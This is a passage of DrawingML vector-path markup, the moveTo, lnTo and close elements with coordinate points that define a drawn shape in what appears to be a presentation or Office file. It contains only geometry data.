                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10455" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10491" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10638" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10748" y="4365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10822" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="4108"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10748" y="4072"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10712" y="3998"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10675" y="3962"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="16434" y="477"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="16617" y="514"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16764" y="587"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16837" y="734"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16911" y="880"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16947" y="1064"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16947" y="1247"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16911" y="1541"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16764" y="1871"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16544" y="2128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16104" y="2641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15077" y="3668"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14086" y="4549"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14013" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14123" y="4329"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="14967" y="3632"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15370" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15737" y="2825"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16067" y="2384"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16361" y="1908"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16617" y="1431"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16764" y="880"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16764" y="770"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16727" y="697"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16654" y="660"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16544" y="660"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15920" y="770"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15333" y="954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15333" y="954"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15590" y="807"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="15884" y="660"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16177" y="550"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="16434" y="477"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="9354" y="4182"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="9208" y="4255"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="4365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9134" y="4439"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="4512"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9208" y="4585"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9281" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9428" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="4585"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="4475"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="4292"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="4255"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="4182"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="13243" y="6566"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13169" y="6639"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13133" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13133" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13133" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13206" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13316" y="7006"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13463" y="6970"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13536" y="6933"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13536" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13573" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13536" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13463" y="6603"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13316" y="6566"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="12216" y="7300"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12105" y="7336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11995" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11995" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="7703"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12105" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12216" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12362" y="7703"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12436" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12436" y="7520"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12436" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12326" y="7336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12216" y="7300"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="12729" y="8033"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12656" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12656" y="8143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12619" y="8253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12619" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12656" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12692" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12802" y="8510"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12912" y="8474"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13022" y="8400"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13022" y="8253"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13022" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12949" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12912" y="8033"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="10051" y="2128"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="10455" y="2164"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10858" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11262" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="2458"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11262" y="2568"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11335" y="2641"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11445" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11629" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11775" y="2788"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12105" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12179" y="2971"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12252" y="3008"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12472" y="3191"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12692" y="3412"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13096" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11482" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="5796"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6090" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="8620"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5356" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="7960"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="7557"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5906" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5870" y="7483"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="7593"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="8437"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="8840"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4732" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4622" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="7630"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5649" y="7190"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="6786"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="6750"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6016" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5943" y="6713"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5539" y="7043"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="7410"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4842" y="7777"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4512" y="8180"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="7923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="7667"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4659" y="7336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="7080"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="6016"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5723" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5686" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5576" y="5906"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5283" y="6199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="6529"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="7153"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4402" y="6529"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4622" y="6199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="5759"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5136" y="5502"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="5392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5429" y="5319"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5429" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="5246"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5173" y="5209"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5063" y="5282"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="5356"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4769" y="5539"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4622" y="5722"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4476" y="5869"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4586" y="5466"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4732" y="5062"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4879" y="4842"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5026" y="4622"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5209" y="4402"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5393" y="4219"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="3852"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6236" y="3522"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6677" y="3228"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7117" y="2935"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7594" y="2715"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8070" y="2494"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="2348"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="2238"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="2164"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="2128"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="13316" y="4219"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13426" y="4365"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12582" y="5026"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="5649"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="6273"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="6860"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="7446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7887" y="8033"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6860" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5796" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4989" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4916" y="9317"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4953" y="9207"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6053" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10198" y="6089"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11775" y="5136"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13316" y="4219"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="3962" y="7960"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="3999" y="8070"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="8107"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4146" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="9024"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3925" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3925" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3999" y="9244"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3339" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3008" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2642" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2898" y="9171"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3229" y="8694"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="8327"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3962" y="7960"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="13609" y="4732"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13683" y="4915"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12986" y="5502"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12105" y="6199"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="6823"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10308" y="7446"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9354" y="8033"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8401" y="8584"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7447" y="9097"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6456" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5429" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5246" y="9794"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="5466" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="6603" y="9134"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7740" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="7923"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="7263"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10895" y="6676"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="6053"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12729" y="5392"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13609" y="4732"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="11995" y="9721"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="12472" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12436" y="9867"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="10271"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12032" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11995" y="9721"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="2715" y="8804"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="2422" y="9317"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="9867"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2165" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2201" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="10124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2898" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3449" y="9867"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3925" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4439" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="4549" y="9684"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3559" y="10124"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="3082" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2568" y="10528"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2275" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2018" y="10674"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1761" y="10711"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="1468" y="10711"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2091" y="9794"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2348" y="9317"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2642" y="8877"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="2715" y="8804"/>
                  </a:lnTo>
                  <a:close/>
                  <a:moveTo>
                    <a:pt x="13829" y="5429"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="13940" y="5943"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13940" y="6456"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13940" y="6896"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13866" y="7336"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13756" y="7740"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13609" y="8143"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13426" y="8547"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="13206" y="8914"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12949" y="9281"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12656" y="9647"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="12289" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11922" y="9537"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11849" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11812" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11775" y="9647"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11702" y="10491"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11409" y="10711"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="10821"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11152" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11042" y="10931"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11042" y="10564"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11115" y="10198"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="9867"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11298" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11298" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11262" y="9427"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11225" y="9427"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11188" y="9464"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="11078" y="9647"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10968" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10785" y="10234"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10712" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10712" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10271" y="11261"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9831" y="11371"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9868" y="11005"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9978" y="10638"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10051" y="10344"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10161" y="10088"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10418" y="9537"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10381" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="9501"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10345" y="9537"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="10015" y="9941"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9758" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9538" y="10895"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9501" y="11151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9428" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="11408"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8951" y="11261"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8877" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8841" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8731" y="11298"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9171" y="10454"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9391" y="10051"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="9647"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9684" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9648" y="9574"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9611" y="9611"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="9244" y="10014"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8914" y="10418"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8621" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8327" y="11335"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7960" y="11225"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="11188"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7997" y="11151"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7960" y="11115"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7960" y="11078"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7924" y="10968"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="7960" y="10858"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8034" y="10601"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8181" y="10308"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8474" y="9831"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="9427"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8804" y="9391"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8767" y="9317"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8694" y="9317"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="8364" y="9537"/>
                  </a:lnTo>
                  <a:lnTo>
